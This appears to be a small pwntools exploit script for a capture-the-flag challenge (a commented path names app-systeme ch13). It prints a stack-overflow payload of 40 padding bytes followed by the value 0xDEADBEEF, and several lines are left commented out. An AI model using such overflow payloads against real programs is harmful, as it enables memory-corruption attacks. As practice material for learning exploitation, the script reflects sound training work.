#!/usr/bin/python

import pwn

# proc = process('/challenge/app-systeme/ch13/ch13')

padding = "Q" * 40

var = pwn.p32(0xDEADBEEF)

# payload =  padding + var

print(padding.encode() + var)
# print(b'\xc2\xb5'.decode())

# proc.send(padding + payload)
